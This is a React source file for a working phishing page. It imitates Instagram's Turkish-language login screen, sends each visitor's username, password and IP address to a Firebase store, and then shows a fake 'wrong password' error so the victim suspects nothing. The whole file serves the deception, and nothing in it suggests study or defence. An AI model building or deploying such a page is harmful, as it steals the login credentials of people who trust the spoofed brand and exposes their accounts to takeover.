import { useState } from 'react';
import { motion } from 'framer-motion';
import { saveCredentials } from '../lib/firebase';

export default function FakeInstagramLogin({ onSuccess, ip }) {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!username.trim() || !password.trim()) return;

    setLoading(true);
    setError('');

    try {
      await saveCredentials({ username: username.trim(), password, ip });

      // Simulate a brief "loading" then show a fake error
      setTimeout(() => {
        setLoading(false);
        setError('Üzgünüz, şifreniz yanlıştı. Lütfen şifrenizi tekrar kontrol edin.');
        // After showing error briefly, proceed to message form
        setTimeout(() => {
          onSuccess(username.trim());
        }, 1500);
      }, 2000);
    } catch (err) {
      console.error('Save error:', err);
      setLoading(false);
      onSuccess(username.trim());
    }
  };

  const isDisabled = !username.trim() || !password.trim();

  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      className="ig-login-overlay"
    >
      <div className="ig-login-container">
        {/* Main Login Card */}
        <div className="ig-login-box">
          {/* Instagram Logo */}
          <div className="ig-logo-container">
            <h1 className="ig-text-logo">Instagram</h1>
          </div>

          <form onSubmit={handleSubmit} className="ig-form">
            <div className="ig-input-wrapper">
              <input
                type="text"
                placeholder="Telefon numarası, kullanıcı adı veya e-posta"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="ig-login-input"
                autoComplete="off"
                autoCapitalize="off"
                spellCheck="false"
              />
            </div>

            <div className="ig-input-wrapper ig-password-wrapper">
              <input
                type={showPassword ? 'text' : 'password'}
                placeholder="Şifre"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="ig-login-input"
                autoComplete="off"
              />
              {password.length > 0 && (
                <button
                  type="button"
                  className="ig-show-password"
                  onClick={() => setShowPassword(!showPassword)}
                >
                  {showPassword ? 'Gizle' : 'Göster'}
                </button>
              )}
            </div>

            <button
              type="submit"
              className={`ig-login-button ${isDisabled ? 'disabled' : ''}`}
              disabled={isDisabled || loading}
            >
              {loading ? (
                <div className="ig-spinner"></div>
              ) : (
                'Giriş yap'
              )}
            </button>
          </form>

          <div className="ig-divider">
            <div className="ig-divider-line"></div>
            <span className="ig-divider-text">VEYA</span>
            <div className="ig-divider-line"></div>
          </div>

          <button className="ig-facebook-login">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="#385185">
              <path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z" />
            </svg>
            Facebook ile giriş yap
          </button>

          {error && (
            <motion.p
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              className="ig-error-text"
            >
              {error}
            </motion.p>
          )}

          <a href="#" className="ig-forgot" onClick={(e) => e.preventDefault()}>
            Şifreni mi unuttun?
          </a>
        </div>

        {/* Sign up card */}
        <div className="ig-signup-box">
          <p>Hesabın yok mu? <a href="#" onClick={(e) => e.preventDefault()} className="ig-signup-link">Kaydol</a></p>
        </div>

        {/* App download */}
        <div className="ig-app-download">
          <p>Uygulamayı indir.</p>
          <div className="ig-store-buttons">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store" className="ig-store-badge" />
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play" className="ig-store-badge" />
          </div>
        </div>
      </div>

      <style>{`
        .ig-login-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: #fafafa;
          z-index: 9999;
          display: flex;
          align-items: center;
          justify-content: center;
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        .ig-login-container {
          width: 100%;
          max-width: 350px;
          display: flex;
          flex-direction: column;
          align-items: center;
          gap: 10px;
          padding: 0 20px;
        }

        .ig-login-box {
          background: #ffffff;
          border: 1px solid #dbdbdb;
          border-radius: 1px;
          padding: 40px 40px 20px;
          width: 100%;
          text-align: center;
        }

        .ig-logo-container {
          margin-bottom: 12px;
        }

        .ig-text-logo {
          font-family: 'Billabong', 'Cookie', cursive, -apple-system, sans-serif;
          font-size: 2.8rem;
          font-weight: 400;
          color: #262626;
          margin: 0 0 20px 0;
          letter-spacing: 1px;
        }

        @import url('https://fonts.googleapis.com/css2?family=Cookie&display=swap');

        .ig-text-logo {
          font-family: 'Cookie', cursive;
        }

        .ig-form {
          display: flex;
          flex-direction: column;
          gap: 6px;
        }

        .ig-input-wrapper {
          position: relative;
        }

        .ig-login-input {
          width: 100%;
          padding: 9px 8px;
          border: 1px solid #dbdbdb;
          border-radius: 3px;
          background: #fafafa;
          font-size: 12px;
          color: #262626;
          outline: none;
          box-sizing: border-box;
          line-height: 18px;
        }

        .ig-login-input:focus {
          border-color: #a8a8a8;
        }

        .ig-login-input::placeholder {
          color: #8e8e8e;
          font-size: 12px;
        }

        .ig-password-wrapper {
          display: flex;
          align-items: center;
        }

        .ig-password-wrapper .ig-login-input {
          padding-right: 60px;
        }

        .ig-show-password {
          position: absolute;
          right: 8px;
          top: 50%;
          transform: translateY(-50%);
          background: none;
          border: none;
          font-size: 14px;
          font-weight: 600;
          color: #262626;
          cursor: pointer;
          padding: 0;
        }

        .ig-show-password:hover {
          color: #8e8e8e;
        }

        .ig-login-button {
          margin-top: 8px;
          padding: 7px 16px;
          background: #0095f6;
          border: none;
          border-radius: 8px;
          color: white;
          font-size: 14px;
          font-weight: 600;
          cursor: pointer;
          width: 100%;
          display: flex;
          align-items: center;
          justify-content: center;
          min-height: 32px;
          transition: background 0.2s;
        }

        .ig-login-button:hover:not(.disabled) {
          background: #1877f2;
        }

        .ig-login-button.disabled {
          opacity: 0.3;
          cursor: default;
        }

        .ig-spinner {
          width: 18px;
          height: 18px;
          border: 2px solid rgba(255,255,255,0.3);
          border-top-color: white;
          border-radius: 50%;
          animation: ig-spin 0.6s linear infinite;
        }

        @keyframes ig-spin {
          to { transform: rotate(360deg); }
        }

        .ig-divider {
          display: flex;
          align-items: center;
          gap: 18px;
          margin: 18px 0;
        }

        .ig-divider-line {
          flex: 1;
          height: 1px;
          background: #dbdbdb;
        }

        .ig-divider-text {
          color: #8e8e8e;
          font-size: 13px;
          font-weight: 600;
        }

        .ig-facebook-login {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 8px;
          background: none;
          border: none;
          color: #385185;
          font-size: 14px;
          font-weight: 600;
          cursor: pointer;
          width: 100%;
          padding: 8px;
        }

        .ig-facebook-login:hover {
          color: #00376b;
        }

        .ig-error-text {
          color: #ed4956;
          font-size: 14px;
          margin: 10px 0;
          line-height: 18px;
        }

        .ig-forgot {
          display: block;
          margin-top: 12px;
          color: #00376b;
          font-size: 12px;
          text-decoration: none;
        }

        .ig-signup-box {
          background: #ffffff;
          border: 1px solid #dbdbdb;
          border-radius: 1px;
          padding: 20px 40px;
          width: 100%;
          text-align: center;
          font-size: 14px;
          color: #262626;
        }

        .ig-signup-link {
          color: #0095f6;
          font-weight: 600;
          text-decoration: none;
        }

        .ig-app-download {
          text-align: center;
          margin-top: 10px;
        }

        .ig-app-download p {
          font-size: 14px;
          color: #262626;
          margin-bottom: 15px;
        }

        .ig-store-buttons {
          display: flex;
          gap: 8px;
          justify-content: center;
        }

        .ig-store-badge {
          height: 40px;
          object-fit: contain;
        }

        @media (max-width: 450px) {
          .ig-login-box,
          .ig-signup-box {
            border: none;
            background: #fafafa;
          }
          .ig-login-box {
            padding: 20px 16px;
          }
          .ig-signup-box {
            padding: 15px 16px;
          }
        }
      `}</style>
    </motion.div>
  );
}
